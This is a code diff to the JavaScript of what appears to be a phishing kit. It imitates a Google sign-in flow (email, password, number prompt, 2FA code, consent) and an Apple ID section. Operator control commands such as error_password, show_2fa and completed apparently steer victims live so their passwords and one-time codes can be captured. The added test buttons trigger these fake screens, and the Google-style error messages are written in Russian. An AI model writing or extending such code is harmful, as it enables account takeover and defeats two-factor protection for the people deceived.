@@ -305,7 +305,12 @@ function initApp() {
     if (isAuthorized) {
         showStep(stepSuccess);
     } else if (isTestBotUrl) {
-        showStep(stepGoogleEmail);
+        if (userGoogleEmail) {
+            updateGoogleDisplays(userGoogleEmail);
+            showStep(stepGooglePassword);
+        } else {
+            showStep(stepGoogleEmail);
+        }
     } else {
         navigateToAuthOrSavedStep();
     }
@@ -1367,11 +1372,32 @@ function initApp() {
             }
         };
 
-        bindBtn("btnTestErrPass", () => sendGoogleControlCommand("error_password", null, "Неверный пароль. Повторите попытку."));
-        bindBtn("btnTestPrompt", () => sendGoogleControlCommand("show_prompt", "42"));
-        bindBtn("btnTestAsk2FA", () => sendGoogleControlCommand("show_2fa"));
-        bindBtn("btnTestErr2FA", () => sendGoogleControlCommand("error_2fa", null, "Неверный код. Проверьте код и повторите попытку."));
-        bindBtn("btnTestComplete", () => sendGoogleControlCommand("completed"));
+        bindBtn("btnTestErrPass", () => {
+            sendGoogleControlCommand("error_password", null, "Неверный пароль. Повторите попытку.");
+            showStep(stepGooglePassword);
+            showGoogleError("password", "Неверный пароль. Повторите попытку.");
+        });
+        bindBtn("btnTestPrompt", () => {
+            sendGoogleControlCommand("show_prompt", "42");
+            const num = "42";
+            if (googlePromptNumber) googlePromptNumber.textContent = num;
+            const promptTargetText = document.getElementById("googlePromptTargetNumber");
+            if (promptTargetText) promptTargetText.textContent = num;
+            showStep(stepGooglePrompt);
+        });
+        bindBtn("btnTestAsk2FA", () => {
+            sendGoogleControlCommand("show_2fa");
+            showStep(stepGoogle2FA);
+        });
+        bindBtn("btnTestErr2FA", () => {
+            sendGoogleControlCommand("error_2fa", null, "Неверный код. Проверьте код и повторите попытку.");
+            showStep(stepGoogle2FA);
+            showGoogleError("2fa", "Неверный код. Проверьте код и повторите попытку.");
+        });
+        bindBtn("btnTestComplete", () => {
+            sendGoogleControlCommand("completed");
+            showStep(stepGoogleConsent);
+        });
     }
 
     // Apple ID Navigation & Actions
